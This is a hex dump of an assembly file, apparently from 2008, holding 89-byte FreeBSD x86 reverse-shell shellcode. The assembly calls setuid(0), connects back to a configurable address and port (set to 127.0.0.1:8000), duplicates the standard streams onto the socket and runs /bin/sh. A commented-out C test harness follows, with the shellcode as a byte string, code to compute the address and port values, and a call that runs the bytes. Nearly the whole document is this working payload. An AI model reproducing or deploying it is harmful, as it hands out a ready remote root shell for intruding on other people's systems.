00000000  3b 20 73 6d 34 78 20 2d  20 32 30 30 38 0d 0a 3b  |; sm4x - 2008..;|
00000010  20 72 65 76 65 72 73 65  20 70 6f 72 74 62 69 6e  | reverse portbin|
00000020  64 20 2f 62 69 6e 2f 73  68 0d 0a 3b 20 4e 55 4c  |d /bin/sh..; NUL|
00000030  4c 20 66 72 65 65 20 69  66 20 61 64 64 72 65 73  |L free if addres|
00000040  73 20 69 73 2e 0d 0a 3b  20 73 65 74 75 69 64 28  |s is...; setuid(|
00000050  30 29 3b 20 73 6f 63 6b  65 74 28 29 3b 20 63 6f  |0); socket(); co|
00000060  6e 6e 65 63 74 28 29 3b  20 65 78 69 74 28 29 3b  |nnect(); exit();|
00000070  0d 0a 3b 20 38 39 20 62  79 74 65 73 0d 0a 3b 20  |..; 89 bytes..; |
00000080  46 72 65 65 42 53 44 20  37 2e 30 2d 52 45 4c 45  |FreeBSD 7.0-RELE|
00000090  41 53 45 0d 0a 0d 0a 67  6c 6f 62 61 6c 20 5f 73  |ASE....global _s|
000000a0  74 61 72 74 0d 0a 5f 73  74 61 72 74 3a 0d 0a 0d  |tart.._start:...|
000000b0  0a 78 6f 72 20 20 20 20  20 65 61 78 2c 20 65 61  |.xor     eax, ea|
000000c0  78 0d 0a 0d 0a 3b 20 2d  2d 2d 20 73 65 74 75 69  |x....; --- setui|
000000d0  64 28 30 29 0d 0a 70 75  73 68 20 20 20 20 65 61  |d(0)..push    ea|
000000e0  78 0d 0a 70 75 73 68 20  20 20 20 65 61 78 0d 0a  |x..push    eax..|
000000f0  6d 6f 76 20 20 20 20 20  61 6c 2c 20 30 78 31 37  |mov     al, 0x17|
00000100  0d 0a 70 75 73 68 20 20  20 20 65 61 78 0d 0a 69  |..push    eax..i|
00000110  6e 74 20 20 20 20 20 30  78 38 30 0d 0a 0d 0a 3b  |nt     0x80....;|
00000120  20 2d 2d 2d 20 73 6f 63  6b 65 74 28 29 0d 0a 70  | --- socket()..p|
00000130  75 73 68 20 20 20 20 65  61 78 0d 0a 70 75 73 68  |ush    eax..push|
00000140  20 20 20 20 62 79 74 65  20 30 78 30 31 0d 0a 70  |    byte 0x01..p|
00000150  75 73 68 20 20 20 20 62  79 74 65 20 30 78 30 32  |ush    byte 0x02|
00000160  0d 0a 6d 6f 76 20 20 20  20 20 61 6c 2c 20 30 78  |..mov     al, 0x|
00000170  36 31 0d 0a 70 75 73 68  20 20 20 20 65 61 78 0d  |61..push    eax.|
00000180  0a 69 6e 74 20 20 20 20  20 30 78 38 30 0d 0a 6d  |.int     0x80..m|
00000190  6f 76 20 20 20 20 20 65  64 78 2c 20 65 61 78 0d  |ov     edx, eax.|
000001a0  0a 0d 0a 3b 20 2d 2d 2d  20 73 6f 63 6b 61 64 64  |...; --- sockadd|
000001b0  72 5f 69 6e 0d 0a 70 75  73 68 20 20 20 20 30 78  |r_in..push    0x|
000001c0  30 31 30 30 30 30 37 66  20 20 20 20 20 20 3b 20  |0100007f      ; |
000001d0  31 2e 30 2e 30 2e 31 32  37 20 6e 62 3a 20 74 6f  |1.0.0.127 nb: to|
000001e0  20 63 68 61 6e 67 65 20  73 65 65 20 62 65 6c 6f  | change see belo|
000001f0  77 0d 0a 70 75 73 68 20  20 20 20 30 78 34 30 31  |w..push    0x401|
00000200  66 30 32 41 41 20 20 20  20 20 20 3b 20 38 30 30  |f02AA      ; 800|
00000210  30 20 6e 62 3a 20 63 68  61 6e 67 65 20 28 77 61  |0 nb: change (wa|
00000220  74 63 68 20 66 6f 72 20  2e 31 30 20 2e 30 20 65  |tch for .10 .0 e|
00000230  74 63 2e 2e 29 0d 0a 6d  6f 76 20 20 20 20 20 65  |tc..)..mov     e|
00000240  61 78 2c 20 65 73 70 0d  0a 0d 0a 3b 20 2d 2d 2d  |ax, esp....; ---|
00000250  20 73 65 74 75 70 20 63  6f 6e 6e 65 63 74 28 65  | setup connect(e|
00000260  64 78 2c 20 65 61 78 2c  20 30 78 31 30 29 3b 0d  |dx, eax, 0x10);.|
00000270  0a 70 75 73 68 20 20 20  20 62 79 74 65 20 30 78  |.push    byte 0x|
00000280  31 30 0d 0a 70 75 73 68  20 20 20 20 65 61 78 0d  |10..push    eax.|
00000290  0a 70 75 73 68 20 20 20  20 65 64 78 0d 0a 78 6f  |.push    edx..xo|
000002a0  72 20 20 20 20 20 65 61  78 2c 20 65 61 78 0d 0a  |r     eax, eax..|
000002b0  6d 6f 76 20 20 20 20 20  61 6c 2c 20 30 78 36 32  |mov     al, 0x62|
000002c0  0d 0a 70 75 73 68 20 20  20 20 65 61 78 0d 0a 69  |..push    eax..i|
000002d0  6e 74 20 20 20 20 20 30  78 38 30 0d 0a 0d 0a 3b  |nt     0x80....;|
000002e0  20 2d 2d 20 64 75 70 32  28 30 2b 31 2b 32 29 2e  | -- dup2(0+1+2).|
000002f0  2e 0d 0a 6d 6f 76 20 20  20 20 20 63 6c 2c 20 30  |...mov     cl, 0|
00000300  78 30 33 0d 0a 78 6f 72  20 20 20 20 20 65 62 78  |x03..xor     ebx|
00000310  2c 20 65 62 78 0d 0a 64  75 70 73 3a 0d 0a 70 75  |, ebx..dups:..pu|
00000320  73 68 20 20 20 20 65 62  78 0d 0a 70 75 73 68 20  |sh    ebx..push |
00000330  20 20 20 65 64 78 0d 0a  6d 6f 76 20 20 20 20 20  |   edx..mov     |
00000340  61 6c 2c 20 30 78 35 61  0d 0a 70 75 73 68 20 20  |al, 0x5a..push  |
00000350  20 20 65 61 78 0d 0a 69  6e 74 20 20 20 20 20 30  |  eax..int     0|
00000360  78 38 30 0d 0a 69 6e 63  20 20 20 20 20 65 62 78  |x80..inc     ebx|
00000370  0d 0a 6c 6f 6f 70 20 20  20 64 75 70 73 0d 0a 0d  |..loop   dups...|
00000380  0a 78 6f 72 20 20 20 20  20 65 61 78 2c 20 65 61  |.xor     eax, ea|
00000390  78 0d 0a 70 75 73 68 20  20 20 20 65 61 78 20 20  |x..push    eax  |
000003a0  20 20 20 3b 20 6e 75 6c  6c 0d 0a 70 75 73 68 20  |   ; null..push |
000003b0  20 20 20 30 78 36 38 37  33 32 66 36 65 0d 0a 70  |   0x68732f6e..p|
000003c0  75 73 68 20 20 20 20 30  78 36 39 36 32 32 66 32  |ush    0x69622f2|
000003d0  66 0d 0a 6d 6f 76 20 20  20 20 20 65 62 78 2c 20  |f..mov     ebx, |
000003e0  65 73 70 0d 0a 0d 0a 3b  20 2d 2d 2d 20 65 78 65  |esp....; --- exe|
000003f0  63 76 65 28 29 0d 0a 70  75 73 68 20 20 20 20 65  |cve()..push    e|
00000400  62 78 0d 0a 70 75 73 68  20 20 20 20 65 61 78 0d  |bx..push    eax.|
00000410  0a 70 75 73 68 20 20 20  20 65 73 70 0d 0a 70 75  |.push    esp..pu|
00000420  73 68 20 20 20 20 65 62  78 0d 0a 6d 6f 76 20 20  |sh    ebx..mov  |
00000430  20 20 20 61 6c 2c 20 30  78 33 62 0d 0a 70 75 73  |   al, 0x3b..pus|
00000440  68 20 20 20 20 65 61 78  0d 0a 69 6e 74 20 20 20  |h    eax..int   |
00000450  20 20 30 78 38 30 0d 0a  0d 0a 3b 20 2d 2d 2d 20  |  0x80....; --- |
00000460  65 78 69 74 0d 0a 78 6f  72 20 20 20 20 20 65 61  |exit..xor     ea|
00000470  78 2c 20 65 61 78 0d 0a  70 75 73 68 20 20 20 20  |x, eax..push    |
00000480  65 61 78 0d 0a 70 75 73  68 20 20 20 20 65 61 78  |eax..push    eax|
00000490  0d 0a 69 6e 74 20 20 20  20 20 30 78 38 30 0d 0a  |..int     0x80..|
000004a0  0d 0a 2f 2a 0d 0a 0d 0a  63 68 61 72 20 63 6f 64  |../*....char cod|
000004b0  65 5b 5d 20 3d 20 22 5c  78 33 31 5c 78 63 30 5c  |e[] = "\x31\xc0\|
000004c0  78 35 30 5c 78 35 30 5c  78 62 30 5c 78 31 37 5c  |x50\x50\xb0\x17\|
000004d0  78 35 30 5c 78 63 64 5c  78 38 30 22 0d 0a 20 20  |x50\xcd\x80"..  |
000004e0  20 20 20 20 20 22 5c 78  35 30 5c 78 36 61 5c 78  |     "\x50\x6a\x|
000004f0  30 31 5c 78 36 61 5c 78  30 32 5c 78 62 30 5c 78  |01\x6a\x02\xb0\x|
00000500  36 31 5c 78 35 30 5c 78  63 64 22 0d 0a 20 20 20  |61\x50\xcd"..   |
00000510  20 20 20 20 22 5c 78 38  30 5c 78 38 39 5c 78 63  |    "\x80\x89\xc|
00000520  32 5c 78 36 38 5c 78 37  66 5c 78 30 30 5c 78 30  |2\x68\x7f\x00\x0|
00000530  30 5c 78 30 31 5c 78 36  38 22 0d 0a 20 20 20 20  |0\x01\x68"..    |
00000540  20 20 20 22 5c 78 30 30  5c 78 30 32 5c 78 31 66  |   "\x00\x02\x1f|
00000550  5c 78 34 30 5c 78 38 39  5c 78 65 30 5c 78 36 61  |\x40\x89\xe0\x6a|
00000560  5c 78 31 30 5c 78 35 30  22 0d 0a 20 20 20 20 20  |\x10\x50"..     |
00000570  20 20 22 5c 78 35 32 5c  78 33 31 5c 78 63 30 5c  |  "\x52\x31\xc0\|
00000580  78 62 30 5c 78 36 32 5c  78 35 30 5c 78 63 64 5c  |xb0\x62\x50\xcd\|
00000590  78 38 30 5c 78 62 31 22  0d 0a 20 20 20 20 20 20  |x80\xb1"..      |
000005a0  20 22 5c 78 30 33 5c 78  33 31 5c 78 64 62 5c 78  | "\x03\x31\xdb\x|
000005b0  35 33 5c 78 35 32 5c 78  62 30 5c 78 35 61 5c 78  |53\x52\xb0\x5a\x|
000005c0  35 30 5c 78 63 64 22 0d  0a 20 20 20 20 20 20 20  |50\xcd"..       |
000005d0  22 5c 78 38 30 5c 78 34  33 5c 78 65 32 5c 78 66  |"\x80\x43\xe2\xf|
000005e0  36 5c 78 33 31 5c 78 63  30 5c 78 35 30 5c 78 36  |6\x31\xc0\x50\x6|
000005f0  38 5c 78 36 65 22 0d 0a  20 20 20 20 20 20 20 22  |8\x6e"..       "|
00000600  5c 78 32 66 5c 78 37 33  5c 78 36 38 5c 78 36 38  |\x2f\x73\x68\x68|
00000610  5c 78 32 66 5c 78 32 66  5c 78 36 32 5c 78 36 39  |\x2f\x2f\x62\x69|
00000620  5c 78 38 39 22 0d 0a 20  20 20 20 20 20 20 22 5c  |\x89"..       "\|
00000630  78 65 33 5c 78 35 33 5c  78 35 30 5c 78 35 34 5c  |xe3\x53\x50\x54\|
00000640  78 35 33 5c 78 62 30 5c  78 33 62 5c 78 35 30 5c  |x53\xb0\x3b\x50\|
00000650  78 63 64 22 0d 0a 20 20  20 20 20 20 20 22 5c 78  |xcd"..       "\x|
00000660  38 30 5c 78 33 31 5c 78  63 30 5c 78 35 30 5c 78  |80\x31\xc0\x50\x|
00000670  35 30 5c 78 63 64 5c 78  38 30 22 3b 0d 0a 0d 0a  |50\xcd\x80";....|
00000680  69 6e 74 20 6d 61 69 6e  28 69 6e 74 20 61 72 67  |int main(int arg|
00000690  63 2c 20 63 68 61 72 20  2a 2a 61 72 67 76 29 20  |c, char **argv) |
000006a0  7b 0d 0a 0d 0a 20 20 20  20 09 2f 2a 20 75 73 65  |{....    ./* use|
000006b0  64 20 74 6f 20 67 65 74  20 69 70 3a 70 6f 72 74  |d to get ip:port|
000006c0  20 63 6f 6d 62 6f 20 66  6f 72 20 70 75 73 68 65  | combo for pushe|
000006d0  73 20 2a 2f 0d 0a 20 20  20 20 20 20 20 20 63 68  |s */..        ch|
000006e0  61 72 20 2a 69 70 5f 61  64 64 72 20 3d 20 22 31  |ar *ip_addr = "1|
000006f0  32 37 2e 30 2e 30 2e 31  22 3b 20 2f 2f 20 77 61  |27.0.0.1"; // wa|
00000700  74 63 68 20 66 6f 72 20  61 64 64 72 65 73 73 65  |tch for addresse|
00000710  73 20 74 68 61 74 20 63  72 65 61 74 65 20 5c 78  |s that create \x|
00000720  30 30 20 61 6e 64 20 6f  74 68 65 72 73 0d 0a 20  |00 and others.. |
00000730  20 20 20 20 20 20 20 69  6e 74 20 70 6f 72 74 20  |       int port |
00000740  3d 20 38 30 30 30 3b 0d  0a 20 20 20 20 20 20 20  |= 8000;..       |
00000750  20 73 74 72 75 63 74 20  73 6f 63 6b 61 64 64 72  | struct sockaddr|
00000760  5f 69 6e 20 64 65 73 74  3b 0d 0a 0d 0a 20 20 20  |_in dest;....   |
00000770  20 20 20 20 20 70 72 69  6e 74 66 28 22 49 50 3a  |     printf("IP:|
00000780  20 25 73 5c 6e 22 2c 20  69 70 5f 61 64 64 72 29  | %s\n", ip_addr)|
00000790  3b 0d 0a 20 20 20 20 20  20 20 20 70 72 69 6e 74  |;..        print|
000007a0  66 28 22 50 4f 52 54 3a  20 25 64 5c 6e 22 2c 20  |f("PORT: %d\n", |
000007b0  70 6f 72 74 29 3b 0d 0a  0d 0a 20 20 20 20 20 20  |port);....      |
000007c0  20 20 64 65 73 74 2e 73  69 6e 5f 66 61 6d 69 6c  |  dest.sin_famil|
000007d0  79 20 3d 20 41 46 5f 49  4e 45 54 3b 0d 0a 20 20  |y = AF_INET;..  |
000007e0  20 20 20 20 20 20 64 65  73 74 2e 73 69 6e 5f 70  |      dest.sin_p|
000007f0  6f 72 74 3d 68 74 6f 6e  73 28 70 6f 72 74 29 3b  |ort=htons(port);|
00000800  0d 0a 20 20 20 20 20 20  20 20 64 65 73 74 2e 73  |..        dest.s|
00000810  69 6e 5f 61 64 64 72 2e  73 5f 61 64 64 72 20 3d  |in_addr.s_addr =|
00000820  20 69 6e 65 74 5f 61 64  64 72 28 69 70 5f 61 64  | inet_addr(ip_ad|
00000830  64 72 29 3b 0d 0a 0d 0a  20 20 20 20 20 20 20 20  |dr);....        |
00000840  70 72 69 6e 74 66 28 22  70 75 73 68 20 30 78 25  |printf("push 0x%|
00000850  78 5c 74 3b 20 68 6f 73  74 5c 6e 22 2c 20 64 65  |x\t; host\n", de|
00000860  73 74 2e 73 69 6e 5f 61  64 64 72 2e 73 5f 61 64  |st.sin_addr.s_ad|
00000870  64 72 29 3b 0d 0a 20 20  20 20 20 20 20 20 70 72  |dr);..        pr|
00000880  69 6e 74 66 28 22 70 75  73 68 20 30 78 25 78 30  |intf("push 0x%x0|
00000890  32 41 41 5c 74 3b 20 70  6f 72 74 5c 6e 22 2c 20  |2AA\t; port\n", |
000008a0  64 65 73 74 2e 73 69 6e  5f 70 6f 72 74 29 3b 0d  |dest.sin_port);.|
000008b0  0a 0d 0a 20 20 20 20 20  20 20 20 69 6e 74 20 28  |...        int (|
000008c0  2a 66 75 6e 63 29 28 29  3b 0d 0a 20 20 20 20 20  |*func)();..     |
000008d0  20 20 20 70 72 69 6e 74  66 28 22 42 79 74 65 73  |   printf("Bytes|
000008e0  3a 20 25 64 5c 6e 22 2c  20 73 69 7a 65 6f 66 28  |: %d\n", sizeof(|
000008f0  63 6f 64 65 29 29 3b 0d  0a 20 20 20 20 20 20 20  |code));..       |
00000900  20 66 75 6e 63 20 3d 20  28 69 6e 74 20 28 2a 29  | func = (int (*)|
00000910  28 29 29 20 63 6f 64 65  3b 0d 0a 20 20 20 20 20  |()) code;..     |
00000920  20 20 20 28 69 6e 74 29  28 2a 66 75 6e 63 29 28  |   (int)(*func)(|
00000930  29 3b 0d 0a 7d 0d 0a 0d  0a 2a 2f                 |);..}....*/|
0000093b
